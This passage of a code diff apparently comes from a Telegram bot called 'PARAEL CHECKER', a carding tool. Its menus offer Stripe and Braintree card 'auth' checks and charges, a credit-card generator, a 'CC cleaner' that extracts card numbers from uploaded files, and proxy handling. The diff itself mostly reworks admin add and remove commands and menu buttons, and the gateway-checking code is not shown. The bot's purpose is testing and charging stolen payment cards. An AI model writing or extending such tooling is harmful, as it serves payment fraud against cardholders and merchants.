-            host, port, user, pwd = parts
-            proxy_url = f"http://{user}:{pwd}@{host}:{port}"
-            new_proxies.append(proxy_url)
-    if new_proxies:
-        proxy_list = new_proxies
-        save_proxies_to_file(proxy_list)
-        await update.message.reply_text(f"PROXY SUCCESSFULLY UPDATED, TOTAL {len(proxy_list)} PROXIES SAVED AND IN USE")
-    else:
-        await update.message.reply_text("WRONG PROXY FORMAT. USE host:port:user:pass ONE PER LINE")
+    
+    if 'awaiting_admin_id' in context.user_data:
+        user_id_text = update.message.text.strip()
+        
+        if not user_id_text.isdigit():
+            await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER")
+            return
+        
+        try:
+            new_admin_id = int(user_id_text)
+        except:
+            await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER")
+            return
+        
+        if new_admin_id in admin_chat_ids:
+            await update.message.reply_text(f"USER ID {new_admin_id} IS ALREADY AN ADMIN")
+            return
+        
+        if new_admin_id == OWNER_ADMIN_ID:
+            await update.message.reply_text("THIS USER IS ALREADY THE OWNER ADMIN")
+            return
+        
+        admin_chat_ids.add(new_admin_id)
+        save_admin_chat_ids(admin_chat_ids)
+        await update.message.reply_text(f"USER ID {new_admin_id} HAS BEEN SUCCESSFULLY ADDED AS ADMIN!")
+        
+        del context.user_data['awaiting_admin_id']
+        await show_admin_menu(update, context)
+    
+    elif 'awaiting_admin_removal' in context.user_data:
+        user_id_text = update.message.text.strip()
+        
+        if not user_id_text.isdigit():
+            await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER")
+            return
+        
+        try:
+            remove_admin_id = int(user_id_text)
+        except:
+            await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER")
+            return
+        
+        if remove_admin_id not in admin_chat_ids:
+            await update.message.reply_text(f"USER ID {remove_admin_id} IS NOT AN ADMIN")
+            return
+        
+        if remove_admin_id == OWNER_ADMIN_ID:
+            await update.message.reply_text("YOU CANNOT REMOVE YOURSELF AS OWNER ADMIN ❌")
+            return
+        
+        admin_chat_ids.remove(remove_admin_id)
+        save_admin_chat_ids(admin_chat_ids)
+        await update.message.reply_text(f"USER ID {remove_admin_id} HAS BEEN REMOVED FROM ADMIN")
+        
+        del context.user_data['awaiting_admin_removal']
+        await show_admin_menu(update, context)
 
-# ---------------------- ADMIN COMMANDS ----------------------
-async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    chat_id = update.effective_chat.id
-    if chat_id != OWNER_ADMIN_ID:
-        await update.message.reply_text("ONLY OWNER ADMIN CAN ADD ANOTHER ADMIN ❌")
-        return
-    if not context.args or len(context.args) != 1:
-        await update.message.reply_text("/addadmin USER ID")
-        return
-    try:
-        new_admin_id = int(context.args[0])
-    except:
-        await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER")
-        return
-    if new_admin_id in admin_chat_ids:
-        await update.message.reply_text(f"USER ID {new_admin_id} IS ALREADY AN ADMIN")
-        return
-    admin_chat_ids.add(new_admin_id)
-    save_admin_chat_ids(admin_chat_ids)
-    await update.message.reply_text(f"USER ID {new_admin_id} HAS BEEN SUCCESSFULLY ADDED AS ADMIN!")
+async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    await show_admin_menu(update, context)
 
-async def deladmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    chat_id = update.effective_chat.id
-    if chat_id != OWNER_ADMIN_ID:
-        await update.message.reply_text("ONLY OWNER ADMIN CAN REMOVE AN ADMIN ❌")
-        return
-    if not context.args or len(context.args) != 1:
-        await update.message.reply_text("/deladmin USER ID")
-        return
-    try:
-        remove_admin_id = int(context.args[0])
-    except:
-        await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER")
-        return
-    if remove_admin_id not in admin_chat_ids:
-        await update.message.reply_text(f"USER ID {remove_admin_id} IS NOT AN ADMIN")
-        return
-    if remove_admin_id == OWNER_ADMIN_ID:
-        await update.message.reply_text("YOU CANNOT REMOVE YOURSELF AS OWNER ADMIN ❌")
-        return
-    admin_chat_ids.remove(remove_admin_id)
-    save_admin_chat_ids(admin_chat_ids)
-    await update.message.reply_text(f"USER ID {remove_admin_id} HAS BEEN REMOVED FROM ADMIN")
-
-# ---------------------- INTERACTIVE MENU ----------------------
+# --- INTERACTIVE MENU ---
 def build_menu_keyboard():
     keyboard = [
         [InlineKeyboardButton("STRIPE AUTH", callback_data='sa'),
@@ -1122,8 +1340,7 @@ def build_menu_keyboard():
          InlineKeyboardButton("CC GENERATOR", callback_data='gen')],
         [InlineKeyboardButton("CC CLEANER", callback_data='clean'),
          InlineKeyboardButton("ADMIN", callback_data='admin')],
-        [InlineKeyboardButton("PROXY", callback_data='proxy'),
-         InlineKeyboardButton("HELP", callback_data='help')]
+        [InlineKeyboardButton("HELP", callback_data='help')]
     ]
     return InlineKeyboardMarkup(keyboard)
 
@@ -1133,53 +1350,91 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     
     chat_id = query.from_user.id
     
-    await query.edit_message_reply_markup(reply_markup=None)
-    
     if query.data == 'sa':
         active_mode_per_chat[chat_id] = 'stripe'
-        await query.edit_message_text("𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV")
+        keyboard = [[InlineKeyboardButton("BACK", callback_data='back')]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            "𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV",
+            reply_markup=reply_markup
+        )
     elif query.data == 'ba':
         active_mode_per_chat[chat_id] = 'braintree'
-        await query.edit_message_text("𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV")
+        keyboard = [[InlineKeyboardButton("BACK", callback_data='back')]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            "𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV",
+            reply_markup=reply_markup
+        )
     elif query.data == 'sc':
         active_mode_per_chat[chat_id] = 'stripe_charge'
-        await query.edit_message_text("𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘\nSEND CARDS ➯ CC|MM|YY|CVV")
+        keyboard = [[InlineKeyboardButton("BACK", callback_data='back')]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            "𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘\nSEND CARDS ➯ CC|MM|YY|CVV",
+            reply_markup=reply_markup
+        )
     elif query.data == 'gen':
-        await query.edit_message_text("𝗖𝗖 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥\n\n")
-        await gen_command(query, context)
+        keyboard = [[InlineKeyboardButton("BACK", callback_data='back')]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            "🃏 CARDS GENERATOR 🃏\n\n"
+            "/gen 550230 5",
+            reply_markup=reply_markup
+        )
     elif query.data == 'clean':
-        await query.edit_message_text("𝗖𝗖 𝗖𝗟𝗘𝗔𝗡𝗘𝗥\n\n")
-        await clean_command(query, context)
+        keyboard = [[InlineKeyboardButton("BACK", callback_data='back')]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            "𝗖𝗖 𝗖𝗟𝗘𝗔𝗡𝗘𝗥\n\n"
+            "SEND A FILE TO EXTRACT CC",
+            reply_markup=reply_markup
+        )
     elif query.data == 'admin':
-        await show_admin_menu(query, context)
-    elif query.data == 'proxy':
-        await query.edit_message_text("𝗣𝗥𝗢𝗫𝗬\n\nHOST:PORT:USER:PASS")
-        await cmd_proxy(query, context)
+        keyboard = [
+            [InlineKeyboardButton("ADD ADMIN", callback_data='addadmin')],
+            [InlineKeyboardButton("REMOVE ADMIN", callback_data='deladmin')],
+            [InlineKeyboardButton("BACK", callback_data='back')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            "𝗔𝗗𝗠𝗜𝗡 𝗠𝗘𝗡𝗨\n\n",
+            reply_markup=reply_markup
+        )
     elif query.data == 'help':
-        await query.edit_message_text("𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 - Check cards with Stripe\n𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 - Check cards with Braintree\n𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 - Charge cards with Stripe\n𝗖𝗖 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥 - Generate credit cards\n𝗖𝗖 𝗖𝗟𝗘𝗔𝗡𝗘𝗥 - Extract cards from files\n𝗔𝗗𝗠𝗜𝗡 - Admin management\n𝗣𝗥𝗢𝗫𝗬 - Manage proxies\n\n/start return to main menu")
+        keyboard = [[InlineKeyboardButton("BACK", callback_data='back')]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        help_text = (
+            "𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 ➯ CHECK STRIPE\n"
+            "𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 ➯ CHECK BRAINTREE\n"
+            "𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 ➯ CHARGE STRIPE\n"
+            "𝗖𝗖 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥 ➯ GENERATE CARDS\n"
+            "𝗖𝗖 𝗖𝗟𝗘𝗔𝗡𝗘𝗥 ➯ EXTRACT CARDS\n"
+            "𝗔𝗗𝗠𝗜𝗡 ➯ ADD/REMOVE ADMIN\n"
+        )
+        await query.edit_message_text(help_text, reply_markup=reply_markup)
     elif query.data == 'addadmin':
-        await query.edit_message_text("𝗔𝗗𝗗 𝗔𝗗𝗠𝗜𝗡\n\n/addadmin <USER_ID>")
-        await addadmin(query, context)
+        await add_admin_callback(update, context)
     elif query.data == 'deladmin':
-        await query.edit_message_text("𝗥𝗘𝗠𝗢𝗩𝗘 𝗔𝗗𝗠𝗜𝗡\n\n/deladmin <USER_ID>")
-        await deladmin(query, context)
+        await del_admin_callback(update, context)
     elif query.data == 'back':
         keyboard = build_menu_keyboard()
         await query.edit_message_text("𝗣𝗔𝗥𝗔𝗘𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n\n", reply_markup=keyboard)
 
-async def show_admin_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    keyboard = [
-        [InlineKeyboardButton("ADD ADMIN", callback_data='addadmin'),
-         InlineKeyboardButton("REMOVE ADMIN", callback_data='deladmin')],
-        [InlineKeyboardButton("BACK", callback_data='back')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.edit_message_text(
-        "𝗔𝗗𝗠𝗜𝗡 𝗠𝗘𝗡𝗨\n\n",
-        reply_markup=reply_markup
-    )
+async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    chat_id = update.effective_chat.id
+    text = update.message.text.strip()
+    
+    if 'awaiting_admin_id' in context.user_data:
+        await handle_admin_id_input(update, context)
+        return
+    
+    if 'awaiting_admin_removal' in context.user_data:
+        await handle_admin_id_input(update, context)
+        return
+    
+    await handle_cc_message(update, context)
 
-# ---------------------- START COMMAND ----------------------
 async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if update.effective_user.id != OWNER_ADMIN_ID:
         return
@@ -1188,9 +1443,8 @@ async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     await update.message.reply_text(
         "𝗣𝗔𝗥𝗔𝗘𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n\n",
         reply_markup=keyboard
-    )
+   )
 
-# ---------------------- MAIN SCRIPT ----------------------
 if __name__ == "__main__":
     import sys
     proxy_list = load_proxies_from_file()
@@ -1200,13 +1454,9 @@ if __name__ == "__main__":
     application.add_handler(CommandHandler("ba", BraintreeAuth.start_braintree))
     application.add_handler(CommandHandler("sc", StripeCharge.start_stripe_charge))
     application.add_handler(CommandHandler("gen", ccgen_advanced))
-    application.add_handler(CommandHandler("clean", clean_command))
-    application.add_handler(CommandHandler("proxy", cmd_proxy))
-    application.add_handler(CommandHandler("addadmin", addadmin))
-    application.add_handler(CommandHandler("deladmin", deladmin))
+    application.add_handler(CommandHandler("admin", cmd_admin))
     application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
-    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_cc_message))
-    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), message_handler_proxy))
+    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_text_message))
     application.add_handler(CallbackQueryHandler(button_callback))
     application.add_handler(CommandHandler("start", start_handler))
     
